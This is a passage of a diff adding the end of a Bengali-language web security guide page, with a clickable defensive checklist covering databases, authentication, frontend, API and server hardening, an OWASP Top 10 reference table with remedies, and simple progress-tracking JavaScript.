+      <div class="section-subtitle">প্রতিটি আইটেম চেক করুন — ক্লিক করলে সম্পন্ন হবে</div>
+    </div>
+  </div>
+
+  <div style="font-size:0.85rem;color:var(--text-muted);margin-bottom:20px">
+    👆 প্রতিটি আইটেমে ক্লিক করুন সম্পন্ন হিসেবে চিহ্নিত করতে
+  </div>
+
+  <div style="margin-bottom:16px;font-weight:700;color:var(--accent)">🗄️ ডেটাবেজ সিকিউরিটি</div>
+  <div class="checklist" id="checklist-container">
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>সব SQL কোয়েরিতে Prepared Statement ব্যবহার</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>ডেটাবেজ ইউজারের ন্যূনতম permission (principle of least privilege)</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>ডেটাবেজ credentials .env ফাইলে, কোডে নয়</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>নিয়মিত ডেটাবেজ ব্যাকআপ এবং এনক্রিপ্টেড স্টোরেজ</span>
+    </div>
+  </div>
+
+  <div style="margin:24px 0 16px;font-weight:700;color:var(--accent)">🔐 অথেন্টিকেশন</div>
+  <div class="checklist">
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>পাসওয়ার্ড bcrypt/Argon2 দিয়ে হ্যাশ</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>Two-Factor Authentication (2FA) সক্রিয়</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>লগইনে Rate Limiting (৫ বার ব্যর্থে লক)</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>JWT টোকেনে এক্সপায়ারি সেট (১৫ মিনিট)</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>পাসওয়ার্ড রিসেটে টোকেন এক্সপায়ারি</span>
+    </div>
+  </div>
+
+  <div style="margin:24px 0 16px;font-weight:700;color:var(--accent)">🌐 ফ্রন্টএন্ড সিকিউরিটি</div>
+  <div class="checklist">
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>সব আউটপুটে HTML escaping (XSS প্রতিরোধ)</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>Content Security Policy (CSP) হেডার সেট</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>innerHTML এর বদলে textContent ব্যবহার</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>HTTPS সর্বত্র (HTTP Strict Transport Security)</span>
+    </div>
+  </div>
+
+  <div style="margin:24px 0 16px;font-weight:700;color:var(--accent)">📡 API সিকিউরিটি</div>
+  <div class="checklist">
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>প্রতিটি API-তে Authorization চেক</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>CORS সঠিকভাবে কনফিগার (wildcard * নয়)</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>API Rate Limiting সক্রিয়</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>ইনপুট ভ্যালিডেশন সার্ভার সাইডে</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>এরর মেসেজে sensitive তথ্য প্রকাশ নয়</span>
+    </div>
+  </div>
+
+  <div style="margin:24px 0 16px;font-weight:700;color:var(--accent)">🛡️ সার্ভার ও ইনফ্রাস্ট্রাকচার</div>
+  <div class="checklist">
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>সব সফটওয়্যার আপডেট রাখুন</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>Firewall সক্রিয় ও প্রয়োজনীয় পোর্ট মাত্র খোলা</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>সিকিউরিটি লগিং ও মনিটরিং সক্রিয়</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>SSL/TLS সার্টিফিকেট বৈধ ও আপডেট</span>
+    </div>
+    <div class="check-item" onclick="toggleCheck(this)">
+      <div class="check-box">✓</div>
+      <span>নিয়মিত পেনিট্রেশন টেস্টিং</span>
+    </div>
+  </div>
+</section>
+
+<!-- QUICK REFERENCE -->
+<section class="section fade-in">
+  <div class="section-header">
+    <div class="section-icon" style="background:rgba(255,215,0,0.12)">⚡</div>
+    <div>
+      <div class="section-title">দ্রুত রেফারেন্স — OWASP Top 10</div>
+      <div class="section-subtitle">সবচেয়ে প্রচলিত ১০টি ওয়েব দুর্বলতা</div>
+    </div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>#</th><th>দুর্বলতা</th><th>ঝুঁকি</th><th>সমাধান</th></tr>
+      </thead>
+      <tbody>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A01</td><td>Broken Access Control</td><td><span class="badge critical">ক্রিটিকাল</span></td><td>Authorization চেক সর্বত্র</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A02</td><td>Cryptographic Failures</td><td><span class="badge critical">ক্রিটিকাল</span></td><td>AES-256, bcrypt ব্যবহার</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A03</td><td>Injection</td><td><span class="badge critical">ক্রিটিকাল</span></td><td>Prepared Statement</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A04</td><td>Insecure Design</td><td><span class="badge high">উচ্চ</span></td><td>Threat Modeling</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A05</td><td>Security Misconfiguration</td><td><span class="badge high">উচ্চ</span></td><td>Secure defaults, CSP</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A06</td><td>Vulnerable Components</td><td><span class="badge high">উচ্চ</span></td><td>নিয়মিত আপডেট</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A07</td><td>Authentication Failures</td><td><span class="badge high">উচ্চ</span></td><td>MFA, Rate Limiting</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A08</td><td>Software Integrity Failures</td><td><span class="badge medium">মধ্যম</span></td><td>CI/CD সিকিউরিটি</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A09</td><td>Security Logging Failures</td><td><span class="badge medium">মধ্যম</span></td><td>সম্পূর্ণ লগিং</td></tr>
+        <tr><td style="color:var(--accent);font-family:'JetBrains Mono',monospace">A10</td><td>Server-Side Request Forgery</td><td><span class="badge medium">মধ্যম</span></td><td>URL ভ্যালিডেশন</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+</div><!-- /container -->
+
+<footer>
+  <div style="font-size:1.5rem;margin-bottom:12px">🛡️</div>
+  <div style="color:var(--text-muted);margin-bottom:8px">ওয়েব অ্যাপ্লিকেশন সিকিউরিটি গাইডলাইন — বাংলায়</div>
+  <div style="color:var(--text-dim);font-size:0.75rem">OWASP Top 10 • 2024 সালের সর্বোত্তম অনুশীলন অনুযায়ী</div>
+</footer>
+
+<script>
+// Tab switching
+function showTab(btn, id) {
+  const card = btn.closest('.vuln-card');
+  card.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  card.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById(id).classList.add('active');
+}
+
+// Checklist
+let totalChecked = 0;
+const allItems = document.querySelectorAll('.check-item');
+const total = allItems.length;
+
+function toggleCheck(el) {
+  el.classList.toggle('checked');
+  updateProgress();
+}
+
+function updateProgress() {
+  const checked = document.querySelectorAll('.check-item.checked').length;
+  const pct = Math.round((checked / total) * 100);
+  document.getElementById('mainProgress').style.width = pct + '%';
+  document.getElementById('progressText').textContent = `${checked} টি সম্পন্ন (মোট ${total} টি)`;
+  document.getElementById('progressPct').textContent = pct + '%';
+}
+
+updateProgress();
+
+// Intersection observer for fade-in
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      e.target.classList.add('visible');
+      observer.unobserve(e.target);
+    }
+  });
+}, { threshold: 0.1 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+
+// Animate progress bar on load
+setTimeout(() => {
+  document.getElementById('mainProgress').style.transition = 'width 1s ease';
+}, 300);
+</script>
+</body>
+</html>
